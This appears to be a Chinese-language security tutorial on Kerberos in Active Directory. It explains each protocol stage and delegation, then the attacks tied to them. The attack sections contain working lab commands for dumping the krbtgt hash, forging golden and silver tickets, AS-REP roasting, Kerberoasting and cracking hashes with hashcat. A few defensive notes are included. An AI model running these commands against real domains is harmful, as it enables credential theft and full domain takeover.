> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/PDhCRD1aOcmtd2wMUrv8Qg)

<table><thead><tr><td>DC</td><td width="511.6666666666667">域控</td></tr></thead><tbody><tr><td>KDC</td><td width="504.6666666666667">密钥分发中心，由域控担任</td></tr><tr><td>AD</td><td width="295">活动目录，里面包含域内用户数据库</td></tr></tbody></table>

<table><thead><tr><td>AS</td><td width="335">Kerberos 认证服务</td></tr></thead><tbody><tr><td>TGT</td><td width="498.6666666666667">TGT 认证权证，由 AS 服务发放</td></tr><tr><td>TGS</td><td width="335">票据授予服务</td></tr></tbody></table>

<table><thead><tr><td>ST</td><td>ST 服务票据，由 TGS 服务发送</td><td width="308.6666666666667"><br></td></tr></thead><tbody><tr><td><br></td><td><br></td><td width="302.6666666666667"><br></td></tr><tr><td><br></td><td><br></td><td width="308.6666666666667"><br></td></tr></tbody></table>

**krbtgt** 用户，该用户是在创建域时系统自动创建的一个账号，其作用是密钥发行中心的服务账号，其密码是系统随机生成的，无法正常登陆主机。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIPEh1geFjtEKSkDAahxw6hNLUC3aXibBSZjsjvdn4Pk4H8gwsAQro29w/640?wx_fmt=png)

  
域控 (server08):192.168.3.142  
server08：192.168.3.68  

AS-REQ
======

> 客户端向 KDC 的 AS 认证服务请求 TGT 认证权证。TGT 是 KDC 的 AS 认证服务发放的

1、**AS-REQ**：当域内某个用户试图访问域中的某个服务，于是输入用户名和密码，本机的 Kerberos 服务会向 KDC 的 AS 认证服务发送一个 AS-REQ 认证请求。该请求包中包含： **请求的用户名**、**客户端主机名、加密类型** 和 **Authenticator(用户 NTLM Hash 加密的时间戳**)**  ** 以及一些其他信息。  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIfSlqBP1IISmWdJIrPsTshA30CN07n645ojSicWTOCoEjtzU5eM4UwNA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIVvrN8Jp8kDbTnvYzchzzkocBeSwDlSdTdhrDm8yjPRsRQN0gVWiaS1g/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIUfSW9cTsyKPqnXbngDz7HcEUkN0rEoQibI79ZQN2uHrGOd7XUPEodAw/640?wx_fmt=png)

AS-REQ 阶段产生的攻击方式
----------------

### 1.HASH 传递

在 AS-REQ 阶段，是用用户密码 Hash 加密的 Authenticator，所以也就造成了 hash 传递  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIcqhEsD11uhEKwOGic8wdQBgVEJx0cLNJaB3f7aaaS2QlJicvQ7J352gw/640?wx_fmt=png)

  
只适用于域环境，并且目标主机需要安装 KB2871997 补丁 PTK  

### 2. 域内用户枚举

AS-REQ 的 cname 值，当用户不存在时，返回包提示错误，所以造成了改攻击方式。user.txt 不需要加上 @0day.org，也可以使用 udp  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIC084X1wF5TPR08ibHOsKD2nrkzxcbtlzdjrTnny25deDnusccS0iaGtw/640?wx_fmt=png)

### 3. 密码喷洒

并且当用户名存在，密码正确和错误时，返回包也不一样，所以可以进行用户名密码爆破。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率  

针对明文：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIyBUXaJPHRTze1mpYLLIUqUWDYJ94nztBtT7yAr1N2iaLBuIm1VO8yYQ/640?wx_fmt=png)

针对 ntlm hash：  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIgibEU1ibgIg4Ne8fvtqWWDSRMGHWn24h0pUEpqJliaiclD5aehC4BpxtuQ/640?wx_fmt=png)

AS-REP
======

2、**AS-REP**：当 KDC 接收到请求之后，通过 AD 活动目录查询得到该用户的密码 Hash，用该密码 Hash 对请求包的 Authenticator 进行解密，如果解密成功，则证明请求者提供的密码正确，而且需要时间戳范围在五分钟内，且不是重放，于是预认证成功。KAS 成功认证对方的身份之后，发送响应包给客户端。响应包中主要包括：**krbtgt 用户的 NTLM Hash 加密后的 TGT 认购权证 (**即 ticket 这部分**)** 和 **用户 NTLM Hash 加密的 Login Session key(**即最外层 enc-part 这部分**)** 以及一些其他信息。该 Login Session Key 的作用是用于确保客户端和 KDC 下阶段之间通信安全。最后 TGT 认购权证、加密的 Lgoin Session Key、时间戳 和 PAC 等信息会发送给客户端。PAC 中包含用户的 SID，用户所在的组等一些信息。  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIahvehymsebodIZVo2N80KdfwnXHRx32u2uSq6bWxvfGicDRwLnDFfkQ/640?wx_fmt=png)

  
在 enc-part 里面最重要的字段是 Login session key，作为下阶段的认证密钥。  
AS-REP 中最核心的东西就是 Login session-key 和 加密的 ticket。正常我们用工具生成的凭据是 .ccache 和 .kirbi 后缀的，用 mimikatz，kekeo，rubeus 生成的凭据是以 .kirbi 后缀的，impacket 生成的凭据的后缀是 .ccache 。两种票据主要包含的都是 Login session-key 和 加密的 ticket，因此可以相互转化。

AS-REP 阶段产生的攻击方式
----------------

### 1. 黄金票据

在 AS-REP 阶段，由于返回的 TGT 认购权证是由 krbtgt 用户的密码 Hash 加密的，因此如果我们拥有 krbtgt 的 hash 就可以自己制作一个 TGT 认购权证，这就造成了黄金票据攻击  

伪造黄金票据的前提：

• 要伪造的域用户 (这里我们一般填写域管理员账户)• 域名 • 域的 SID 值 (就是域成员 SID 值去掉最后的)•krbtgt 账号的哈希值或 AES-256 值

**1. 使用 mimikatz**  

先获取 krbtgt hash：  
在域控执行

```
mimikatz.exe "lsadump::dcsync /domain:0day.org /user:krbtgt"
```

得到如下信息：  
sid：S-1-5-21-1812960810-2335050734-3517558805  
ntlm hash：36f9d9e6d98ecf8307baf4f46ef842a2  
aes256：dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9  
伪造用户 administrator 执行 (aes256)

```
mimikatz "kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805/aes256:dbc55f9f925de5a482d3bf5ede7d0d46d4b121c01bdd9d06be4aed367212d3f9 /user:administrator/ticket:gold.kirbi"
```

伪造用户 administrator 执行 (krbtgt hash)

```
mimikatz "kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805/krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /user:administrator /ticket:gold.kirbi"
```

生成文件 gold.kirbi  

导入 Golden Ticket，执行命令：

```
kerberos::ptt C:\Users\jack.0DAY\Desktop\gold.kirbi
```

获得域控权限  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIM854h9gJUpBhaSFDWZc6SImlHTdu7iavESYK3nx722RajXc04eyiaP3g/640?wx_fmt=png)

  
**注意这里格式只能是 主机名. 域名 的形式，而不能写 ip**  

**2. 使用 impacket**  
这里使用 kali，不在域内只需要把 dns 改为域控即可  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIlNcCTl8KIBONzBqMUiaGgdqMjXFJK9kvsTmNmAiaZzEN0RTWh0Bn3K9w/640?wx_fmt=png)

  
先生成票据 administrator.ccache ``` python3 ticketer.py -domain-sid S-1-5-21-1812960810-2335050734-3517558805 -nthash 36f9d9e6d98ecf8307baf4f46ef842a2 -domain 0day.org administrator ```

  
导入票据

```
export KRB5CCNAME=administrator.ccache
```

然后在访问域控

```
python3 smbexec.py -no-pass -k OWA2010SP3.0day.org
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIaUIBTvEx9VvwYZDcthJJhxn5GgEVdYia1QkficB4nPux1EByA8qgczicQ/640?wx_fmt=png)

### 2.AS-REP Roasting

在 AS-REP 阶段，最外层的 enc-part 是用用户密码 Hash 加密的。对于域用户，如果设置了选项” Do not require Kerberos preauthentication”，此时向域控制器的 88 端口发送 AS_REQ 请求，对收到的 AS_REP 内容 (enc-part 底下的 ciper，因为这部分是使用用户 hash 加密的 Login Session Key，我们通过进行离线爆破就可以获得用户 hash) 重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用 hashcat 对其破解，最终获得该用户的明文口令，这就造成了 AS-REP Roasting 攻击。  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIKrfFtDXa0vSRuOthNKMlEkRlvcXR280Z8rK0VyibGaYzX04IITh19ww/640?wx_fmt=png)

  
默认这个功能是不启用的，如果启用 AS-REP 会返回用户 hash 加密的 sessionkey-as，这样我们就可以用 john 离线破解  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaImLGoAKoynQR4kQGSJo6kbxdQOKeqZUhYF7p0wdibRiazFmic27cH79EjQ/640?wx_fmt=png)

  
使用 Empire 下的 powerview.ps1 查找域中设置了 "不需要 kerberos 预身份验证" 的用户

```
Import-Module .\powerview.ps1 Get-DomainUser -PreauthNotRequired
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaItXoRhdoVS6iapiczCLKn8uzx1pxfPu9uek2VssEtZqozk41Gcpv5pOcQ/640?wx_fmt=png)

  
使用 ASREPRoast.ps1 获取 AS-REP 返回的 Hash

```
Import-Module .\ASREPRoast.ps1Get-ASREPHash -UserName jack -Domain 0day.org | Out-File -Encoding ASCII hash.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIe2JkMd9SRZTibU5jtPdiapDcM2CtichPibaTtk7E8Rfoj2buGU2IstwEzg/640?wx_fmt=png)

  
修改为 hashcat 能识别的格式，在 $krb5asrep 后面添加 $23 拼接

```
hashcat -m 18200 hash.txt pass.txt --force
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI3dODytcLafhRpxAWYBdwMQLnjExJqekwGcmyGmsaF6TBULz7UvYywA/640?wx_fmt=png)

TGS-REQ
=======

经过上面的步骤，客户端获得了 TGT 认购权证 和 Login Session Key。然后用自己的密码 NTLM Hash 解密 Login Session Key 得到 原始的 Logon Session Key。然后它会在本地缓存此 TGT 认购权证 和 原始的 Login Session Key。如果现在它需要访问某台服务器的某个服务，它就需要凭借这张 TGT 认购凭证向 KDC 购买相应的入场券 **ST 服务票据（Service Ticket）。**ST 服务票据是通过 KDC 的另一个服务 **TGS（Ticket Granting Service）**出售的。在这个阶段，微软引入了两个扩展自协议 S4u2self 和 S4u2Proxy(当委派的时候，才用的到)  

3、**TGS-REQ**：客户端向 KDC 购买针对指定服务的 ST 服务票据请求，该请求主要包含如下的内容：**客户端信息、Authenticator(Login Session Key 加密的时间戳)、TGT 认购权证 (padata 下 ap-req 下的 ticket) 和 访问的服务名** 以及一些其他信息 。  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIlt4h4UYnJMol4qib70n9528lticzQgQYppLTCaBqnbxE6v4Kdd4A7Z8Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIP2icT00k3ExNM9Fkjy4oWCZ9aT7aoA1RDjAicoxKTl9lSVNzjDBQd1Yw/640?wx_fmt=png)

TGS-REP
=======

4.、TGS-REP：TGS 接收到请求之后，首先会检查自身是否存在客户端所请求的服务。如果服务存在，则通过 krbtgt 用户的 NTLM Hash 解密 TGT 并得到 Login Session Key，然后通过 Login Session Key 解密 Authenticator，如果解密成功，则验证了对方的真实身份，同时还会验证时间戳是否在范围内。并且还会检查 TGT 中的时间戳是否过期，且原始地址是否和 TGT 中保存的地址相同。在完成上述的检测后，如果验证通过，则 TGS 完成了对客户端的认证，会生成一个用 Logon Session Key 加密后的用于确保客户端 - 服务器之间通信安全的 Service Session Key 会话秘钥 (也就是最外层 enc-part 部分)。并且会为该客户端生成 ST 服务票据。ST 服务票据主要包含两方面的内容：客户端用户信息 和 原始 Service Session Key，整个 ST 服务票据用该服务的 NTLM Hash 进行加密。最终 Service Session Key 和 ST 服务票据 发送给客户端。(这一步不管用户有没有访问服务的权限，只要 TGT 正确，就都会返回 ST 服务票据，这也是 kerberoasting 能利用的原因，任何一个用户，只要 hash 正确，就可以请求域内任何一个服务的 ST 票据)  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIRn4f0BqKqs0e0aX2ubrPpp16Uqiargp9yiaNntJo9oe92t8b5xB0cTzw/640?wx_fmt=png)

  
enc-part：这部分是用请求服务的密码 Hash 加密的。因此如果我们拥有服务的密码 Hash，那么我们就可以自己制作一个 ST 服务票据，这就造成了白银票据攻击。也正因为该票据是用请求服务的密码 Hash 加密的，所以当我们得到了 ST 服务票据，可以尝试爆破 enc_part，来得到服务的密码 Hash。这也就造成了 kerberoast 攻击  

TGS-REP 阶段产生的攻击方式
-----------------

### 1.Kerberoast 攻击

Kerberoast 攻击过程：  
1. 攻击者对一个域进行身份验证，然后从域控制器获得一个 TGT 认购权证 ，该 TGT 认购权证用于以后的 ST 服务票据请求  
2. 攻击者使用他们的 TGT 认购权证 发出 ST 服务票据请求 (TGS-REQ) 获取特定形式（name/host）的 servicePrincipalName (SPN)。例如：MSSqlSvc/SQL.domain.com。此 SPN 在域中应该是唯一的，并且在用户或计算机帐户的 servicePrincipalName 字段中注册。在服务票证请求(TGS-REQ) 过程中，攻击者可以指定它们支持的 Kerberos 加密类型(RC4_HMAC，AES256_CTS_HMAC_SHA1_96 等等)。  
3. 如果攻击者的 TGT 是有效的，则 DC 将从 TGT 认购权证 中提取信息并填充到 ST 服务票据中。然后，域控制器查找哪个帐户在 ServicedPrincipalName 字段中注册了所请求的 SPN。ST 服务票据使用注册了所要求的 SPN 的帐户的 NTLM 哈希进行加密, 并使用攻击者和服务帐户共同商定的加密算法。ST 服务票据以服务票据回复 (TGS-REP) 的形式发送回攻击者。  
4. 攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。  
**首先是请求服务票据**  
1.Rubeus.exe 请求

```
Rubeus.exe kerberoast
```

Rubeus 里面的 kerberoast 支持对所有用户或者特定用户执行 kerberoasting 操作，其原理在于先用 LDAP 查询于内的 spn，再通过发送 TGS 包，然后直接打印出能使用 hashcat 或 john 爆破的 Hash。 以下的命令会打印出注册于用户下的所有 SPN 的服务票据的 hashcat 格式。  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIJuL3iceuFOicVnTsCrFvDS8sOYcGPSkTOfX7eywSsLiaH7RibwEPq4lIlg/640?wx_fmt=png)

  
2.powershell 请求

```
#请求服务票据Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/Srv-DB-0day.0day.org:1433"#列出服务票据klist
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIEZRbY645KGns0gG3gfibqrMMb6iaBpamCs7WG1NL1v3uicj8kOQFvEYow/640?wx_fmt=jpeg)

3.mimikatz 请求  
请求指定 SPN 的服务票据

```
#请求服务票据kerberos::ask /target:MSSQLSvc/Srv-DB-0day.0day.org:1433 #列出服务票据kerberos::list  #清除所有票据kerberos::purge
```

4.Impacket 中的 GetUserSPNS.py 请求  
该脚本可以请求注册于用户下的所有 SPN 的服务票据。使用该脚本需要提供域账号密码才能查询。该脚本直接输出 hashcat 格式的服务票据，可用 hashcat 直接爆破。

```
python3 GetUserSPNs.py -request -dc-ip 192.168.200.143 0day.org/jack
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIv0NLsRxUITRKCxlA1xia8xKHibZiaaWKiaibHVA3glTwFwtvU7nibWnE51cQ/640?wx_fmt=jpeg)

这里输入 jack 的密码  
**导出票据**  
首先是查看

```
klist或mimikatz.exe "kerberos::list" MSF里面load kiwikerberos_ticket_list或load kiwikiwi_cmd kerberos::list
```

1.mimikatz 导出

```
mimikatz.exe "kerberos::list /export" "exit"
```

执行完后，会在 mimikatz 同目录下导出 后缀为 kirbi 的票据文件  

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIUUbWWYDTIzcW0ACiapOJWB7zR1CoB1XsLPD3mwgCktqAjvhHGssl37w/640?wx_fmt=jpeg)

  
2.Empire 下的 Invoke-Kerberoast.ps1

```
Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI9gpofy4zIVqACdGetGLyuLBuOAxw4MAsAZdKBXxzTpiaYLfrzRz01LA/640?wx_fmt=jpeg)

  
**离线破解服务票据**  
1.kerberoast 中的 tgsrepcrack.py

```
python2 tgsrepcrack.py password.txt xx.kirbi
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaImCzsMmXibahvCBWAx4ytfxWxhGRUkYCcoScr1T67EvZw4QWRU0mCkhw/640?wx_fmt=jpeg)

  
2.hashcat  
将导出的 hashcat 格式的哈希保存为 hash.txt 文件，放到 hashcat 的目录下

```
hashcat -m  13100  hash.txt  pass.txt
```

**Kerberoast 攻击防范**  
确保服务账号密码为强密码 (长度、随机性、定期修改)  
如果攻击者无法将默认的 AES256_HMAC 加密方式改为 RC4_HMAC_MD5，就无法实验 tgsrepcrack.py 来破解密码。  
攻击者可以通过嗅探的方法抓取 Kerberos TGS 票据。因此，如果强制实验 AES256_HMAC 方式对 Kerberos 票据进行加密，那么，即使攻击者获取了 Kerberos 票据，也无法将其破解，从而保证了活动目录的安全性。  
许多服务账户在内网中被分配了过高的权限，且密码强度较差。攻击者很可能通过破解票据的密码，从域用户权限提升到域管理员权限。因此，应该对服务账户的权限进行适当的配置，并提高密码的强度。  
在进行日志审计时，可以重点关注 ID 为 4679(请求 Kerberos 服务票据) 的时间。如果有过多的 4769 日志，应进一步检查系统中是否存在恶意行为。  

### 2. 白银票据

在 TGS-REP 阶段，TGS_REP 里面的 ticket 的 enc-part 是使用服务的 hash 进行加密的，如果我们拥有服务的 hash，就可以给我们自己签发任意用户的 TGS 票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的 hash，而不是 krbtgt 的 hash，由于生成的是 TGS 票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效 KDC 签名的 PAC。如果将目标主机配置为验证 KDC PAC 签名，则银票将不起作用  
要创建白银票据，我们需要知道以下信息：

• 要伪造的域用户 (这里我们一般填写域管理员账户)• 域名 • 域的 SID 值 (就是域成员 SID 值去掉最后的)• 目标服务的 FQDN• 可利用的服务 • 服务账号的 NTLM 哈希

  
这里使用白银票据伪造 CIFS 服务，该通常用于 Windows 主机之间的文件共享。  

1.mimikatz 获得服务账号的 ntlm hash

```
privilege::Debugsekurlsa::logonpasswords
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIPBNlDgA67DfvInJUQSUjLIfORzzT69vICBTvpxU8qWEol1xPzBSuWQ/640?wx_fmt=png)

  
得到 NTLM 为: 2c268a2a643267a4204a6ef6f896446b  
2. 使用白银票据攻击  

```
kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:2c268a2a643267a4204a6ef6f896446b /user:administrator /ptt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaI1fuicGeadLTA3WVrgeibmuIibicNJzIjR5ya8zABTCL2uKudib6JIYPW4Ug/640?wx_fmt=png)

  
3. 查看票据  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIx9MOXMibBsicicdOI0rLYmVgib82MVdlM4lrwKSFoftbs3nw4kjnb850kQ/640?wx_fmt=png)

  
4. 访问域控  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIJL6AWZyEJqmckLW1jWDfFzxEgFFISAiaibibfwtia7Dd3htdg6rsTeewAA/640?wx_fmt=png)

防御：  
伪造的白银票据没有带有有效 KDC 签名的 PAC。如果将目标主机配置为验证 KDC PAC 签名，则银票将不起作用。  

### 3. 白银票据和黄金票据的不同点

访问权限不同：  
黄金票据 Golden Ticket：伪造 TGT 认购权证，可以获取任何 Kerberos 服务权限  
白银票据 Silver Ticket：伪造 ST 服务票据，只能访问指定的服务  
加密方式不同：  
Golden Ticket 由 krbtgt 的 Hash 加密  
Silver Ticket 由服务账号（通常为计算机账户）Hash 加密  
认证流程不同：  
Golden Ticket 的利用过程需要访问域控，  
而 Silver Ticket 不需要  

委派
==

  
域委派是指，将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。  
服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 MS SQL Server 在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录。  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIjDRlWxHbjibhkgeV14V1T8LCXBrKt1HrnXVNWDELoCNZmA0MlUSe3Kw/640?wx_fmt=png)

  
上图是经典的应用场景。一个域内普通用户 jack 通过 Kerberos 协议认证到前台 WEB 服后，前台运行 WEB 服务的服务账号 websvc 模拟（Impersonate）用户 jack，以 Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取 jack 用户的访问权限，即域中跳或者多跳的 Kerberos 认证。按照图中红色字体的数字，具体步骤如下：

• 域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器；•Web 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请；•KDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT；•websvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 TGS；•KDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 TGS；•websvc 收到的 jack 用户的授权票据 TGS 后，可访问文件服务，完成多跳认证。

  
**在域中，只有 服务账号 和 主机账号 才具有委派属性**  
主机账号就是 AD 活动目录中 Computers 中的计算机，也可以称为机器账号 (一个普通域用户默认最多可以创建十个主机账号)。  
服务账号（Service Account）是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来并加入域。例如 SQL Server 在安装时，会在域内自动注册服务账号 SQLServiceAccount。也可以将域用户通过注册 SPN 变为服务账号。  
**委派的前提**  

需要被委派的用户未设置不允许被委派属性。  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIMD3jTz7C2DFm7YiaKGxq9J3Hg93RdqO6FHopxBuwwwUy2gFsZlDNgicw/640?wx_fmt=png)

  
如果勾上则 administrator 账户不能被委派  

非约束性委派
------

  
对于非约束性委派，服务账号可以获取被委派用户的`TGT`，并将`TGT`缓存到`LSASS`进程中，从而服务账号可使用该`TGT`，模拟用户访问任意服务。  

当服务账号或者主机被设置为非约束性委派时，其`userAccountControl`属性会包含`WORKSTATION_TRUSTED_FOR_DELEGATION`  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIG9O4sWRx2wgjgibFyQSkytEV78S28PzTwpo4KxMls88qfzukso2deVA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIAO7GoXric16dicfF6AkXDgjESbM4NmUxmibiagxTrU2543pOZuX7KHbrrA/640?wx_fmt=png)

  
从网络攻击的角度看，如果攻击者控制了服务账号 B，并诱骗管理员来访问服务 A，则可以获取管理员的 TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。  

约束性委派
-----

  
由于非约束委派的不安全性，微软在 Windows Server 2003 中发布了约束性委派。对于约束性委派（Constrained Delegation），即 Kerberos 的两个扩展子协议 S4u2self (Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )，服务账号只能获取用户的 TGS，从而只能模拟用户访问特定的服务。  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIcyyQlERYyACDW4UKovP3DcjC9OYvqIrEQHCic9tjjLMzcZAR1CsIDIQ/640?wx_fmt=png)

  
配置了约束委派的账户的 userAccountControl 属性有个 FLAG 位 TRUSTED_TO_AUTH_FOR_DELEGATION，并且 msDS-AllowedToDelegateTo 属性还会指定对哪个 SPN 进行委派。  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIkwiaoDnExgvWTD6icFYu5vxOFWAu2CvgiaYl0vAoYvm1vOPwxwCxj4XeA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIHHSAhvtwfIjQ9vBZTV50bLEpxBSoicxSTnEgW0HZCIY6NeY2miaD3M5Q/640?wx_fmt=png)

**基于资源的约束性委派**
--------------

为了使用户 / 资源更加独立，微软在 Windows Server 2012 中引入了基于资源的约束性委派。基于资源的约束委派不需要域管理员权限去设置，而把设置属性的权限赋予给了机器自身。基于资源的约束性委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派只能在运行 Windows Server 2012 和 Windows Server 2012 R2 及以上的域控制器上配置，但可以在混合模式林中应用。配置了基于资源的约束委派的账户的 userAccountControl 属性为 WORKSTATION_TRUST_ACCOUNT，并且 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值为被允许基于资源约束性委派的账号的 SID。   

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaICVX1ib1ar4rbcqfFfQzriajeH6lXFoPAOibkB3xl3VdnPibkTvdhRyl1Kg/640?wx_fmt=png)

基于资源的约束性委派和约束性委派差别
------------------

  
委派的权限授予给了拥有资源的后端 (B)，而不再是前端 (A)  
约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林  
不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑”msDS-AllowedToActOnBehalfOfOtherIdentity” 属性的权限，也就是 将计算机加入域的域用户 和 机器自身 拥有权限。  
传统的约束委派是 “正向的”，通过修改服务 A 的属性”msDS-AllowedToDelegateTo”，添加服务 B 的 SPN（Service Principle Name），设置约束委派对象（服务 B），服务 A 便可以模拟用户向域控制器请求访问服务 B 的 ST 服务票据。  
而基于资源的约束委派则是相反的，通过修改服务 B 属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务 A 的 SID，达到让服务 A 模拟用户访问 B 资源的目的。  

非约束委派和约束委派的流程
-------------

### 1. 非约束委派流程

  
**前提：**在机器账号 B 上配置了非约束性委派 (域管理员才有权限配置)  
1. 用户访问机器 B 的某个服务，于是向 KDC 认证。KDC 会检查机器 B 的机器账号的属性，发现是非约束性委派，KDC 会将用户的 TGT 放在 ST 服务票据中。  
2. 用户访问机器 B 时，TGT 票据会和 ST 服务票据一同发送给机器 B  
3. 这样 B 在验证 ST 服务票据的同时获取了用户的 TGT，并将 TGT 存储在 LSASS 进程中，从而可以模拟用户访问任意服务  
从网络攻击的角度来看，如果攻击者控制了机器 B 的机器账号，并且机器 B 配置了非约束性委派。则攻击者可以诱骗管理员来访问机器 B，然后攻击者可以获取管理员的 TGT，从而模拟管理员访问任意服务，即获得了管理员权限。  

### 2. 约束性委派流程

  
**前提：**在服务 A 上配置到服务 B 约束性委派 (域管理员才有权限配置)  
1. 用户访问服务 A，于是向域控进行 kerberos 认证，域控返回 ST1 服务票据给用户，用户使用此服务票据访问服务 A  
2. 若该服务 A 允许委派给服务 B，则 A 能使用 S4U2Proxy 协议将用户发送给自己的可转发的 ST1 服务票据以用户的身份再转发给域控制器。于是域控返回给服务 A 一个 ST2 服务票据，  
3. 服务 A 便能使用获得的 ST2 服务票据以用户的身份访问服务 B。  
